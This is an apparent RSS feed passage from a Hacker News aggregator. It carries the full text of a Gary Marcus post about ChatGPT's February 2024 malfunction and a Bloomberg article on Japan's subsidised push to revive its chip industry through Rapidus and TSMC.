<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Wed, 21 Feb 2024 12:00:05 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[ChatGPT Has Gone Berserk (244 pts)]]></title>
            <link>https://garymarcus.substack.com/p/chatgpt-has-gone-berserk</link>
            <guid>39450669</guid>
            <pubDate>Wed, 21 Feb 2024 06:09:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://garymarcus.substack.com/p/chatgpt-has-gone-berserk">https://garymarcus.substack.com/p/chatgpt-has-gone-berserk</a>, See on <a href="https://news.ycombinator.com/item?id=39450669">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>That’s not a joke, it’s a quote. And also a warning.</p><p>Over the last few hours, people reporting having been report a variety of problems with ChatGPT:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png" width="1293" height="1212" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/dc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1212,&quot;width&quot;:1293,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:480720,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:false,&quot;topImage&quot;:true,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdc5fc151-c2dd-4d95-9c3f-9dffe783ea55_1293x1212.png 1456w" sizes="100vw" fetchpriority="high"></picture></div></a></figure></div><p><span>Devin Morse, a philosophy PhD student has collected </span><a href="https://x.com/dervine7/status/1760103469359177890?s=61" rel="">more examples in this thread</a><span>.</span></p><p>OpenAI itself has acknowledged the issue:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png" width="768" height="710" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/29568670-f96d-4671-a54d-f5f06f433beb_768x710.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:710,&quot;width&quot;:768,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:144930,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F29568670-f96d-4671-a54d-f5f06f433beb_768x710.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>I won’t speculate on the cause; we don’t know. I won’t speculate on how long it will take to fix; again, we don’t know.</p><p><span>But I will quote something I said two weeks ago: “</span><a href="https://garymarcus.substack.com/p/could-gpt-5-revolutionize-military" rel="">Please, developers and military personnel, don’t let your chatbots grow up to generals</a><span>.”</span></p><p>§</p><p>In the end, Generative AI is a kind of alchemy. People collect the biggest pile of data they can, and (apparently, if rumors are to be believed) tinker with the kinds of hidden prompts that I discussed a few days ago, hoping that everything will work out right:</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png" width="1324" height="1340" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1340,&quot;width&quot;:1324,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1283882,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F508b254d-1b87-4e38-bfd5-81c8df9b2a92_1324x1340.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>The reality, though is that these systems have never been been stable. Nobody has ever been able to engineer safety guarantees around then. We are still living in the age of machine learning alchemy that xkcd captured so well in a </span><a href="https://xkcd.com/1838/" rel="">cartoon</a><span> several years ago:</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png" width="371" height="439" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:439,&quot;width&quot;:371,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:27908,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F09c0bf08-1781-4846-b7cc-f4e7f1547683_371x439.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Thank you xckd for your generous license </figcaption></figure></div><p>The need for altogether different technologies that are less opaque, more interpretable, more maintanable, and more debuggable — and hence more tractable—remains paramount. </p><p>Today’s issue may well be fixed quickly, but I hope it will be seen as the wakeup call that it is.</p><p><em><span>As ever, </span><strong>Gary Marcus</strong><span> longs for trustworthy AI.</span></em><span> </span><em><span>There is a </span><a href="https://www.technologyreview.com/2024/02/20/1088701/i-went-for-a-walk-with-gary-marcus-ais-loudest-critic/" rel="">fun profile of him</a><span> today by Melissa Heikkilä in Technology Review, along with a terrific </span><a href="https://www.cbc.ca/radio/frontburner/ai-video-s-groundbreaking-controversial-leap-forward-1.7119547" rel="">podcast</a><span> today on Sora and society, with Jayme Poisson, at </span><a href="https://www.cbc.ca/radio/frontburner/ai-video-s-groundbreaking-controversial-leap-forward-1.7119547" rel="">CBC’s Frontburner</a><span>.</span></em></p><p data-attrs="{&quot;url&quot;:&quot;https://garymarcus.substack.com/p/chatgpt-has-gone-berserk?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://garymarcus.substack.com/p/chatgpt-has-gone-berserk?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel=""><span>Share</span></a></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Japan Bets $67B to Become a Global Chip Powerhouse Once Again (281 pts)]]></title>
            <link>https://finance.yahoo.com/news/japan-bets-67-billion-become-210013021.html</link>
            <guid>39449748</guid>
            <pubDate>Wed, 21 Feb 2024 03:13:14 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://finance.yahoo.com/news/japan-bets-67-billion-become-210013021.html">https://finance.yahoo.com/news/japan-bets-67-billion-become-210013021.html</a>, See on <a href="https://news.ycombinator.com/item?id=39449748">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p>(Bloomberg) -- Deep in the snowy northern island of Hokkaido, Japan is pouring billions of dollars into a long-shot bet to revive its chip-making prowess and insulate its economy from growing US-China tensions.</p><p>Most Read from Bloomberg</p><ul><li><p><a href="https://www.bloomberg.com/opinion/articles/2024-02-20/retirement-if-you-couldn-t-have-a-401-k-how-would-you-save?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Your 401(k) Will Be Gone Within a Decade;elm:context_link;itc:0;sec:content-canvas">Your 401(k) Will Be Gone Within a Decade</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-19/capital-one-to-buy-discover-financial-in--35-billion-stock-deal?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Capital One to Buy Discover for $35 Billion in Year's Biggest Deal;elm:context_link;itc:0;sec:content-canvas">Capital One to Buy Discover for $35 Billion in Year's Biggest Deal </a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-19/largest-covid-vaccine-study-yet-finds-links-to-health-conditions?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Largest Covid Vaccine Study Yet Finds Links to Health Conditions;elm:context_link;itc:0;sec:content-canvas">Largest Covid Vaccine Study Yet Finds Links to Health Conditions</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-19/stock-market-today-dow-s-p-live-updates?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Stocks Fall Before Nvidia’s Must-Watch Earnings: Markets Wrap;elm:context_link;itc:0;sec:content-canvas">Stocks Fall Before Nvidia’s Must-Watch Earnings: Markets Wrap</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-20/us-tells-allies-russia-may-put-anti-satellite-nuclear-weapon-in-space-this-year?utm_campaign=bn&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:US Tells Allies Russia May Launch Anti-Satellite Nuclear Weapon Into Space This Year;elm:context_link;itc:0;sec:content-canvas">US Tells Allies Russia May Launch Anti-Satellite Nuclear Weapon Into Space This Year</a></p></li></ul><p>Excavators and trucks criss-cross the frosty ground as construction work continues on a futuristic factory looking over a grassy plain with roaming horses. It’s a development that is changing the landscape of an area known for farming, military bases and Chitose airport. It’s a project that also aims to change the face of Japan’s chip industry.</p><p>A freshly created homegrown venture, Rapidus Corp., is looking to mass produce state-of-the art 2 nanometer logic chips in 2027 from an initial starting point of zero. By industry standards it’s an implausible challenge for an 18-month-old venture in a country that has fallen far behind overseas rivals on semiconductor production.But with the US and China sparring over access to the latest chipmaking expertise and equipment, Japan’s government has sensed an opportunity to leverage Washington’s concern over supply chain security to get back into a game it once dominated.</p><p>The stakes are huge. Advanced chips will serve as the foundation for a dozen critical technologies, including artificial intelligence, weapons systems and electric vehicles. A large portion of global production centers on Taiwan and South Korea, leaving future supplies vulnerable to regional tensions.</p><p>“There are geopolitical, economic security factors involved,” said Atsuo Shimizu, a Rapidus executive in charge of launching the new foundry. “To survive as a nation, Japan needs to be a global player with technology. And we can clearly demonstrate that with semiconductors.”</p><p>Tokyo has already shown it means business. In less than three years, Japan has earmarked about ￥4 trillion ($26.7 billion) for revitalizing its semiconductor punching power with Prime Minister Fumio Kishida targeting financial support for the industry to eventually reach ￥10 trillion with private sector support. Among the goals is a tripling of domestically produced chip sales to more than ￥15 trillion by 2030.</p><p>Japan’s new chip strategy has two main strands. First, the country is seeking to reestablish itself as a prime location for manufacturing legacy chips by luring to Japan the biggest foreign names in the industry with generous subsidies of up to half of the set-up costs.The second and more ambitious part of the strategy is the Rapidus project in Hokkaido aimed at restoring Japan’s place as a player at the forefront of silicon-chip wizardry.“Why do we do so much for chips? Honestly, that’s because there’s the US-China confrontation,” said Kazumi Nishikawa, principal director of economic security policy at Japan’s Ministry of Economy, Trade and Industry and one of the architects of the strategy. “If chip supplies from Taiwan halt, there will be negative impacts of trillions of dollars everywhere and economies will collapse.”</p><p>Already Tokyo can claim some success in the first and larger part of its strategy. The world’s biggest chipmaker, Taiwan Semiconductor Manufacturing Co., has a $7 billion factory edging closer to production in Kumamoto, southern Japan, with another one to come and talk of a third. The Taiwanese giant has quickly realized that chip projects partly bankrolled by Tokyo can get off the ground a whole lot faster than in the US or other countries.</p><p>By drawing on the expertise of the world’s leading manufacturers, Japan hopes to recreate chip-related ecosystems that provide employment and renewed growth in its regional economies.Read More: Japan’s Chip Spree Aims to Kick Economy Into High GearAt the same time these moves will help strengthen Japan’s credentials as a key ally in a US-led global supply chain committed to keeping the production line of vital semiconductors rolling for everything from smartphones and cars to the latest missile systems.The fate of the second part of Tokyo’s strategy looks far less certain. The Rapidus project has generated both excitement and doubts. Its success hinges on achieving a huge technological jump with little idea of how costly or reliable the final output will be—or if there will be any buyers. It’s a target that even industry leaders are struggling to attain.</p><p>On the plus side, Japan can lean on the US as its ally this time around, rather than its technological foe—as was the case back in 1986 when Washington put pressure on Tokyo to limit its chip exports.As part of the Rapidus project, IBM Corp. is training about 100 veteran Japanese engineers in Albany, New York, to get them up to speed on frontier level US chip expertise.“We're partners, allies, collaborators in making sure that our national security, our economic securities are aligned, because the threat is coming from somewhere else. And that somewhere else is China,” US Ambassador to Japan Rahm Emanuel said. “We're in the boat together and we're paddling in the same direction.”</p><p>Japan’s strategy marks a departure from previous attempts to support its chip industry that largely assumed it didn’t need outside help -- and ended in failure.</p><p>Along with TSMC, Micron Technology Inc., ASML Holding NV and Samsung Electronics Co. are also investing in production or research facilities in Japan as companies look for the best deals for shoring up their future output in an uncertain world.The speed of Japan’s assistance contrasts with the policy gridlock of the US. The 2022 Chips and Science Act set aside $39 billion in direct subsidies to ramp up manufacturing in the US, but the first major award of $1.5 billion only got announced this week. Labor and cost challenges have also delayed the start of production at TSMC’s new facility in Arizona. Over in Germany, budget turmoil has raised concerns about subsidies for TSMC and Intel Corp.“Japan this time has taken a bold approach and has implemented very quick decision-making,” Belgium-based microelectronics research hub Imec Chief Executive Officer Luc Van den hove said. “If I look back 20 years ago or 15 years ago, I think there was much more a closed policy especially from the government.”</p><p>The TSMC plants have ample reason to be successful. The technology for the first plant’s products, 12nm to 28nm logic chips, is already established. Kumamoto is on Japan’s southern island of Kyushu where there’s an ecosystem of about 1,000 related tech companies. And there are customers – including Japanese carmakers.</p><p>TSMC’s second foundry, officially announced earlier this month, will make 6nm to 7nm chips nearby. By 2037, tax revenues from the foundries are likely to have paid back the initial government outlays, according to lawmaker Yoshihiro Seki, secretary general of a coalition within Japan’s ruling party dedicated to chips.</p><p>Japan is an attractive location for other reasons, too. It has a highly disciplined workforce and reliable services. The plunge in the Japanese yen to its weakest levels in decades has also helped make the country far more affordable as a production base.Japan is also a key global supplier of some of the chemicals and equipment used in chipmaking. Some of those Japanese suppliers, including Tokyo Electron Ltd., have taken advantage of the flipside of the economic security concerns by tapping into a surge of Chinese demand as Beijing looks to ramp up its existing know-how before any more restrictions emerge.</p><p>While some of the reasons for Japan’s attractiveness as a chip-making base also hold true in northern Japan, the circumstances are quite different. Rapidus is starting out in a long-forgotten region for manufacturing with only about 20 local businesses related to chip making.Read More: Japan-Backed Startup Woos Suppliers to Make Chip Hub in HokkaidoExpertise at Japan’s national technology institute has long been stalled at 45 nm, so for Rapidus to reach significant output of 2nm chips using unproven IBM technology in around five years looks a very tall order. Even if Rapidus is able to hit its target by 2027, TSMC and Samsung will likely have already jumped into the market at volumes that will give them a cost advantage.</p><p>Shigeru Fujii headed chipmaking at Japan’s Fujitsu Ltd. when it lost out to cheaper Taiwanese and South Korean rivals in past decades. He’s yet to see evidence that Rapidus can break into the cut-throat global market.“The problem is: Will there be any customers?” Fujii said.</p><p>This time will be different, said Rapidus’s Shimizu, who worked under Fujii at Fujitsu. As its name suggests, Rapidus will add value to its products by shortening delivery time for its bespoke chips – not just via the manufacturing process, but also by helping customers shorten the time-consuming design process, he said.The company won’t be able to compete against TSMC and Samsung for commoditized devices so the company will aim for more of a premium niche market, Shimizu indicated.</p><p>A shift in technology could also help Rapidus, Shimizu added. The 2-nanometer chips it envisages will use a Gate-All-Around transistor structure instead of the current FinFET structure, making it easier for newcomers to break in, Shimizu said.“We can do it,” he said. “I don’t see any reason why we can’t.”</p><p>The government has so far promised ￥330 billion and earmarked an extra ￥646 billion in a fund to support the Rapidus project. That should cover half of an initial ￥2 trillion investment, but the private company has yet to say how it will raise the remaining cash or an extra ￥3 trillion needed to expand operations after the foundry is launched.In contrast to the government support Rapidus enjoys, the reaction from corporate Japan has been lukewarm. Big firms such as Toyota Motor Corp. have pledged only ￥7.3 billion for the venture so far.</p><p>What Bloomberg Intelligence Says…“The Japanese government's latest chip strategy looks better thought out than on previous occasions. The balance is a little skewed toward Rapidus and Kumamoto. Perhaps more could be done to support domestic chip design companies. The challenge for Rapidus is huge, and success probably shouldn't hinge on profits. If it can make any reliable 2 nanometer chips by 2027 that would be a success for Japan in terms of economic security.”-- Masahiro Wakasugi, BI industry analyst</p><p>Even if IBM trains engineers for the company, Rapidus will struggle to hire the 1,000 or so engineers and workers needed to launch the foundry, experts say. Japan’s chip sector hemorrhaged around 30% of its jobs in the two decades through 2019 as its share of the global chipmaking market fell from over 50% to less than 10%. That leaves a shortage of at least 40,000 workers over the next decade as the population declines, according to METI.</p><p>Takashi Yunogami is a former Hitachi Ltd. engineer who made news by fiercely criticizing past government initiatives in parliament right before the chip strategy was released. He likens Rapidus’s 2nm goal to a little leaguer in baseball trying to turn into superstar Shohei Ohtani overnight.</p><p>“Kids should dream, but if a baseball boy says he is trying to do well as a two-way player starting from tomorrow, I’d say, ‘Hold on. Let’s take it step by step,’” Yunogami said.</p><p>Still, in addition to the support from IBM, California-based Lam Research Corp. and Imec are planning to open shop in Hokkaido. Rapidus has also struck an agreement with Canada’s Tenstorrent Inc. to jointly develop semiconductor intellectual property in AI devices.“There are so many risks and challenges for Rapidus. It’s still in a research and development stage before becoming a business,” said METI’s Nishikawa.</p><p>Still, Japan’s hefty subsidies show a renewed determination at the trade and industry ministry to take advantage of a window of opportunity to claw back some of the nation’s chip power. They also reflect the view that in an increasingly hostile world it’s better to throw money at chip technology than to have no contingency plan at all.Russia’s invasion of Ukraine, North Korea’s launching of missiles and China’s posturing toward Taiwan have reminded the world of the vital importance of securing chip supplies and strengthening defense systems.“Chips are used for drones, fighters, submarines and missiles,” said the LDP’s Seki. “If we can make others feel Japan can halt chip exports if they mess with us, that will mean our investment has served as a war deterrent, too.”</p><p>--With assistance from Takashi Mochizuki, Yuki Furukawa, Peter Elstrom and Vlad Savov.</p><p>Most Read from Bloomberg Businessweek</p><ul><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-20/gene-therapy-makers-struggle-to-find-patients-for-miracle-cures?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Gene Therapy Makers Struggle to Find Patients for Miracle Cures;elm:context_link;itc:0;sec:content-canvas">Gene Therapy Makers Struggle to Find Patients for Miracle Cures</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-20/andreessen-horowitz-ups-its-game-in-dc-pursues-american-dynamism?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:Pursuing ‘American Dynamism,’ Andreessen Horowitz Ups Its Game in DC;elm:context_link;itc:0;sec:content-canvas">Pursuing ‘American Dynamism,’ Andreessen Horowitz Ups Its Game in DC</a></p></li><li><p><a href="https://www.bloomberg.com/news/articles/2024-02-20/podcast-the-rise-of-starlink-as-a-geopolitical-force?utm_campaign=bw&amp;utm_medium=distro&amp;utm_source=yahooUS" rel="nofollow noopener" target="_blank" data-ylk="slk:The Rise of Starlink as a Geopolitical Force;elm:context_link;itc:0;sec:content-canvas">The Rise of Starlink as a Geopolitical Force</a></p></li><li><p><a 